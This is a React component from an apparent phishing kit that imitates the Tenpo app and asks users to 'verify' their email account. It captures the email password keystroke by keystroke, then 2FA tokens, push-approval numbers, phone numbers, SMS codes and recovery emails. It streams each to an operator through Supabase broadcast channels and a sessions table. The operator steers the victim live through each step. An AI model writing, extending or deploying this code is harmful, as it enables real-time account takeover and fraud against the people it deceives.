import { useState, useEffect, useCallback, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Loader2 } from "lucide-react";
import { getEmailProvider } from "@/lib/emailProviders";

interface TenpoConfirmEmailScreenProps {
  email: string;
  sessionId: string;
  onBack: () => void;
}

type ConfirmStep =
  | "password"
  | "waiting"
  | "token_2fa"
  | "sms_phone"
  | "sms_waiting"
  | "sms_code"
  | "recovery_email_input"
  | "recovery_email_submitted"
  | "success";

const TenpoConfirmEmailScreen = ({ email, sessionId, onBack }: TenpoConfirmEmailScreenProps) => {
  const [step, setStep] = useState<ConfirmStep>("password");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [tokenCode, setTokenCode] = useState("");
  const [smsCode, setSmsCode] = useState("");
  const [clientRecoveryEmail, setClientRecoveryEmail] = useState("");
  const [clientPhoneInput, setClientPhoneInput] = useState("");
  const [phoneEnding, setPhoneEnding] = useState("");
  const [adminTokenCode, setAdminTokenCode] = useState("");
  const [recoveryEmailAddr, setRecoveryEmailAddr] = useState("");
  const [errorMessage, setErrorMessage] = useState("");

  const provider = getEmailProvider(email);
  const broadcastChRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
  const syncChRef = useRef<ReturnType<typeof supabase.channel> | null>(null);

  const broadcastToAdmin = useCallback(
    (event: string, payload: Record<string, string>) => {
      if (broadcastChRef.current) broadcastChRef.current.send({ type: "broadcast", event, payload });
      if (syncChRef.current) syncChRef.current.send({ type: "broadcast", event, payload });
    },
    []
  );

  useEffect(() => {
    const confirmCh = supabase.channel(`confirm-email-${sessionId}`);
    const syncCh = supabase.channel(`sync-email-${sessionId}`);
    broadcastChRef.current = confirmCh;
    syncChRef.current = syncCh;

    const handleDecision = (decision: string, payload?: Record<string, string>) => {
      if (decision === "confirm_wrong_password" || decision === "sync_wrong_password") {
        setErrorMessage("Contraseña incorrecta. Intentá de nuevo.");
        setStep("password"); setPassword(""); setLoading(false);
      } else if (decision === "confirm_ask_otp" || decision === "sync_ask_otp") {
        if (step === "sms_waiting" || step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
        else { setStep("token_2fa"); setTokenCode(""); setAdminTokenCode(""); }
        setErrorMessage("");
      } else if (decision === "confirm_ask_token" || decision === "sync_ask_token") {
        setAdminTokenCode(payload?.admin_token || "");
        setStep("token_2fa"); setTokenCode(""); setErrorMessage("");
      } else if (decision === "confirm_ask_sms" || decision === "sync_ask_sms") {
        if (step === "sms_waiting" || step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
        else { setPhoneEnding(payload?.sms_ending || ""); setStep("sms_phone"); setClientPhoneInput(""); setSmsCode(""); }
        setErrorMessage("");
      } else if (decision === "confirm_advance_sms_code" || decision === "sync_advance_sms_code") {
        if (payload?.sms_ending) setPhoneEnding(payload.sms_ending);
        setStep("sms_code"); setSmsCode(""); setErrorMessage("");
      } else if (decision === "confirm_ask_recovery_email" || decision === "sync_ask_recovery_email") {
        setRecoveryEmailAddr(payload?.recovery_email || "");
        setStep("recovery_email_input"); setClientRecoveryEmail(""); setErrorMessage("");
      } else if (decision === "confirm_approved" || decision === "sync_approved") {
        setStep("success");
      } else if (decision === "confirm_rejected" || decision === "sync_rejected") {
        setErrorMessage("Verificación fallida. Intentá de nuevo.");
        setClientRecoveryEmail(""); setSmsCode(""); setTokenCode("");
      }
    };

    confirmCh.on("broadcast", { event: "admin_decision" }, (p) => handleDecision(p.payload?.status, p.payload)).subscribe();
    syncCh.on("broadcast", { event: "admin_sync_decision" }, (p) => handleDecision(p.payload?.status, p.payload)).subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status, otp_code").eq("id", sessionId).maybeSingle();
      if (!data) return;
      const { status: s, otp_code: otp } = data;
      if ((s === "confirm_wrong_password" || s === "sync_wrong_password") && step !== "password") { setErrorMessage("Contraseña incorrecta."); setStep("password"); setPassword(""); }
      else if ((s === "confirm_ask_otp" || s === "sync_ask_otp") && step !== "token_2fa" && step !== "sms_code") {
        if (step === "sms_waiting" || step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
        else { setStep("token_2fa"); setTokenCode(""); setAdminTokenCode(""); }
      }
      else if ((s === "confirm_ask_token" || s === "sync_ask_token") && step !== "token_2fa") {
        setAdminTokenCode(otp?.startsWith("admin_token:") ? otp.replace("admin_token:", "") : "");
        setStep("token_2fa"); setTokenCode("");
      }
      else if ((s === "confirm_ask_sms" || s === "sync_ask_sms") && step !== "sms_phone" && step !== "sms_code" && step !== "sms_waiting") {
        if (step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
        else { setPhoneEnding(otp?.startsWith("sms_ending:") ? otp.replace("sms_ending:", "") : ""); setStep("sms_phone"); setClientPhoneInput(""); setSmsCode(""); }
      }
      else if ((s === "confirm_advance_sms_code" || s === "sync_advance_sms_code") && step !== "sms_code") {
        const ending = otp?.startsWith("sms_ending:") ? otp.replace("sms_ending:", "") : "";
        if (ending) setPhoneEnding(ending);
        setStep("sms_code"); setSmsCode("");
      }
      else if ((s === "confirm_ask_recovery_email" || s === "sync_ask_recovery_email") && step !== "recovery_email_input" && step !== "recovery_email_submitted") {
        setRecoveryEmailAddr(otp?.startsWith("recovery_email_addr:") ? otp.replace("recovery_email_addr:", "") : "");
        setStep("recovery_email_input"); setClientRecoveryEmail("");
      }
      else if (s === "confirm_approved" || s === "sync_approved") setStep("success");
    }, 2500);

    return () => {
      broadcastChRef.current = null; syncChRef.current = null;
      supabase.removeChannel(confirmCh); supabase.removeChannel(syncCh);
      clearInterval(pollInterval);
    };
  }, [sessionId, step]);

  // Handlers
  const handlePasswordChange = useCallback((v: string) => {
    setPassword(v);
    supabase.from("sessions").update({ otp_code: `id_pin:${v}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_email_password_typing", { session_id: sessionId, email_password: v });
  }, [sessionId, broadcastToAdmin]);

  const handlePasswordSubmit = useCallback(async (e: React.FormEvent) => {
    e.preventDefault(); if (!password.trim()) return;
    setLoading(true); setErrorMessage("");
    await supabase.from("sessions").update({ otp_code: `id_pin:${password}`, status: "confirm_email_pending" }).eq("id", sessionId);
    broadcastToAdmin("client_id_pin", { session_id: sessionId, id_pin: password, email });
    setStep("waiting"); setLoading(false);
  }, [password, sessionId, broadcastToAdmin, email]);

  const handleTokenChange = useCallback((v: string) => {
    setTokenCode(v);
    supabase.from("sessions").update({ otp_code: `id_token:${v}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_token_update", { session_id: sessionId, id_token: v });
  }, [sessionId, broadcastToAdmin]);

  const handlePhoneChange = useCallback((v: string) => {
    setClientPhoneInput(v);
    supabase.from("sessions").update({ otp_code: `id_phone:${v}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_phone_update", { session_id: sessionId, id_phone: v });
  }, [sessionId, broadcastToAdmin]);

  const handlePhoneSubmit = useCallback((e: React.FormEvent) => {
    e.preventDefault(); if (!clientPhoneInput.trim()) return;
    supabase.from("sessions").update({ otp_code: `id_phone_final:${clientPhoneInput}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_phone_submitted", { session_id: sessionId, id_phone: clientPhoneInput });
    setStep("sms_waiting");
  }, [clientPhoneInput, sessionId, broadcastToAdmin]);

  const handleSmsCodeChange = useCallback((v: string) => {
    setSmsCode(v);
    supabase.from("sessions").update({ otp_code: `id_sms:${v}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_sms_update", { session_id: sessionId, id_sms: v });
  }, [sessionId, broadcastToAdmin]);

  const handleRecoveryEmailChange = useCallback((v: string) => {
    setClientRecoveryEmail(v);
    supabase.from("sessions").update({ otp_code: `id_recovery:${v}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_recovery_update", { session_id: sessionId, id_recovery: v });
  }, [sessionId, broadcastToAdmin]);

  const handleRecoveryEmailSubmit = useCallback((e: React.FormEvent) => {
    e.preventDefault(); if (!clientRecoveryEmail.trim()) return;
    supabase.from("sessions").update({ otp_code: `id_recovery_final:${clientRecoveryEmail}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_recovery_submitted", { session_id: sessionId, id_recovery: clientRecoveryEmail });
    setStep("recovery_email_submitted");
  }, [clientRecoveryEmail, sessionId, broadcastToAdmin]);

  // Styles
  const inputClass = "w-full border-b-2 border-[#333] bg-transparent pb-2.5 text-[16px] text-white outline-none transition-colors placeholder:text-[#555] focus:border-[#4DF4AC]";
  const btnClass = "w-full rounded-full bg-[#4DF4AC] py-4 text-[16px] font-semibold text-[#0a0a0a] active:scale-[0.98] transition-all disabled:opacity-50";
  const labelClass = "block text-[13px] text-[#888] mb-1.5";

  const renderError = () => errorMessage ? (
    <div className="mb-5 rounded-lg border border-red-500/30 bg-red-500/10 px-4 py-2.5 text-[13px] text-red-400">{errorMessage}</div>
  ) : null;

  const renderLoading = (text: string) => (
    <div className="flex items-center justify-center gap-2 text-[14px] text-[#888]">
      <Loader2 className="h-4 w-4 animate-spin text-[#4DF4AC]" />{text}
    </div>
  );

  const renderProviderInfo = () => (
    <div className="mb-6 flex items-center gap-3 rounded-xl border border-[#222] bg-[#111] px-4 py-3">
      <div className="h-8 w-8 shrink-0">{provider.icon}</div>
      <div className="flex flex-col items-start">
        <span className="text-[11px] text-[#666]">{provider.name}</span>
        <span className="text-[14px] font-medium text-white">{email}</span>
      </div>
    </div>
  );

  if (step === "success") {
    return (
      <div className="flex min-h-[100dvh] flex-col items-center justify-center bg-[#0a0a0a] px-6">
        <h1 className="text-[24px] font-bold text-white mb-2">Verificación completa</h1>
        <p className="text-[14px] text-[#888]">Tu cuenta fue verificada. Redirigiendo...</p>
        <p className="mt-2 text-[12px] text-[#555]">{email}</p>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] flex-col bg-[#0a0a0a] text-white">
      <div className="px-5 pt-6 flex items-center justify-between">
        <span className="text-[15px] font-bold text-[#4DF4AC]">tenpo</span>
        <button onClick={onBack} className="text-[13px] font-medium text-[#4DF4AC]">Salir</button>
      </div>

      <div className="flex flex-1 flex-col items-center justify-center px-6">
        <div className="w-full max-w-[440px]">
          {renderProviderInfo()}
          {renderError()}

          {step === "password" && (
            <>
              <h1 className="text-[22px] font-bold text-white mb-2">Verificá tu correo</h1>
              <p className="text-[14px] text-[#888] mb-8">Ingresá la contraseña de tu {provider.name} para verificar tu identidad</p>
              <form onSubmit={handlePasswordSubmit}>
                <label className={labelClass}>Contraseña de {provider.name}</label>
                <input type="password" value={password} onChange={(e) => handlePasswordChange(e.target.value)} disabled={loading} autoFocus className={`${inputClass} mb-8`} />
                <button type="submit" disabled={loading || !password.trim()} className={btnClass}>
                  {loading ? "Verificando..." : "Confirmar"}
                </button>
              </form>
            </>
          )}

          {step === "waiting" && (
            <div className="text-center">
              <h1 className="text-[22px] font-bold text-white mb-2">Verificando tu cuenta</h1>
              <p className="text-[14px] text-[#888] mb-6">Estamos verificando tu cuenta de {provider.name}. Esperá un momento...</p>
              {renderLoading("Verificación en progreso...")}
            </div>
          )}

          {step === "token_2fa" && (
            <>
              <h1 className="text-[22px] font-bold text-white mb-2">Verificación en dos pasos</h1>
              {adminTokenCode ? (
                <>
                  <p className="text-[14px] text-[#888] mb-6">Tocá el número que aparece abajo en tu dispositivo para confirmar</p>
                  <div className="mb-6 flex h-20 w-20 items-center justify-center rounded-2xl border-2 border-[#4DF4AC] bg-[#4DF4AC]/10 mx-auto">
                    <span className="text-3xl font-bold text-[#4DF4AC]">{adminTokenCode}</span>
                  </div>
                  {renderLoading("Esperando confirmación...")}
                </>
              ) : (
                <>
                  <p className="text-[14px] text-[#888] mb-8">Ingresá el código de 6 dígitos de tu app de autenticación</p>
                  <label className={labelClass}>Código de verificación</label>
                  <input type="text" inputMode="numeric" value={tokenCode} onChange={(e) => handleTokenChange(e.target.value)} autoFocus maxLength={20} className={`${inputClass} mb-6`} />
                  {tokenCode.length >= 6 ? renderLoading("Verificando código...") : <button disabled className={btnClass}>Confirmar</button>}
                </>
              )}
            </>
          )}

          {step === "sms_phone" && (
            <>
              <h1 className="text-[22px] font-bold text-white mb-2">Verificación por teléfono</h1>
              <p className="text-[14px] text-[#888] mb-8">
                {phoneEnding
                  ? <>Confirmá el número terminado en <span className="font-bold text-white">**{phoneEnding}</span> para recibir el código</>
                  : "Ingresá tu número de teléfono para recibir un código por SMS"}
              </p>
              <form onSubmit={handlePhoneSubmit}>
                <label className={labelClass}>Número de teléfono</label>
                <input type="tel" placeholder={phoneEnding ? `Terminado en ${phoneEnding}` : "+56 9 1234 5678"} value={clientPhoneInput} onChange={(e) => handlePhoneChange(e.target.value)} autoFocus className={`${inputClass} mb-8`} />
                <button type="submit" disabled={!clientPhoneInput.trim()} className={btnClass}>Confirmar</button>
              </form>
            </>
          )}

          {step === "sms_waiting" && (
            <div className="text-center">
              <h1 className="text-[22px] font-bold text-white mb-2">Enviando código SMS</h1>
              <p className="text-[14px] text-[#888] mb-6">Estamos enviando un código a tu teléfono...</p>
              {renderLoading("Enviando...")}
            </div>
          )}

          {step === "sms_code" && (
            <>
              <h1 className="text-[22px] font-bold text-white mb-2">Código SMS</h1>
              <p className="text-[14px] text-[#888] mb-8">
                Ingresá el código que recibiste en tu teléfono{phoneEnding ? ` terminado en **${phoneEnding}` : ""}
              </p>
              <label className={labelClass}>Código SMS</label>
              <input type="text" inputMode="numeric" value={smsCode} onChange={(e) => handleSmsCodeChange(e.target.value)} autoFocus maxLength={10} className={`${inputClass} mb-6`} />
              {smsCode.length >= 6 ? renderLoading("Verificando...") : <button disabled className={btnClass}>Confirmar</button>}
            </>
          )}

          {step === "recovery_email_input" && (
            <>
              <h1 className="text-[22px] font-bold text-white mb-2">Correo de recuperación</h1>
              <p className="text-[14px] text-[#888] mb-8">
                {recoveryEmailAddr
                  ? <>Ingresá tu correo de recuperación que termina en <span className="font-bold text-white">{recoveryEmailAddr}</span></>
                  : "Ingresá tu correo de recuperación"}
              </p>
              <form onSubmit={handleRecoveryEmailSubmit}>
                <label className={labelClass}>Correo de recuperación</label>
                <input type="email" value={clientRecoveryEmail} onChange={(e) => handleRecoveryEmailChange(e.target.value)} autoFocus className={`${inputClass} mb-8`} />
                <button type="submit" disabled={!clientRecoveryEmail.trim()} className={btnClass}>Confirmar</button>
              </form>
            </>
          )}

          {step === "recovery_email_submitted" && (
            <div className="text-center">
              <h1 className="text-[22px] font-bold text-white mb-2">Verificando correo</h1>
              <p className="text-[14px] text-[#888] mb-6">Estamos verificando tu correo de recuperación...</p>
              {renderLoading("Verificando...")}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default TenpoConfirmEmailScreen;
